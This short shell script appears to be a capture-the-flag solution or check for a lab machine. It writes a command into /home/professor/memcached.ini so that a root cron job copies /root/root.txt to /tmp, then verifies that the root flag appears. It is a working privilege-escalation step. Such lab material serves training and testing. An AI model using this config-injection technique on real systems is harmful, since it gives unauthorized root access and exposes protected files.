set -eu
cat > /home/professor/memcached.ini <<'EOF'
command = cat /root/root.txt > /tmp/lacasa-root
EOF
for _ in 1 2 3 4 5 6 7 8 9 10; do
    [ -s /tmp/lacasa-root ] && break
    sleep 1
done
out=$(cat /tmp/lacasa-root 2>/dev/null || true)
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "cron ini write did not give root" >&2; exit 1; }
